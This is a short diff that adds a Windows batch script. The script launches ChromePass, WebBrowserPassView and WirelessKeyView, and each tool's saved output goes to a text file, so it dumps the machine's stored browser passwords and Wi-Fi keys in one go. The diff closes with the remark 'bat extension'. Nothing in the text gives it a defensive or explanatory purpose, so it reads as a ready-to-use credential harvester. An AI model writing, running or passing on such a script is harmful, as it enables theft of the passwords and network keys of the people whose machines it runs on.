@@ -1,0 +1,5 @@
+start ChromePass.exe /stext ChromePass.txt
+start WebBrowserPassView.exe /stext WebBrowserPassView.txt
+start WirelessKeyView.exe /stext WirelessKeyView.txt
+
+bat extension
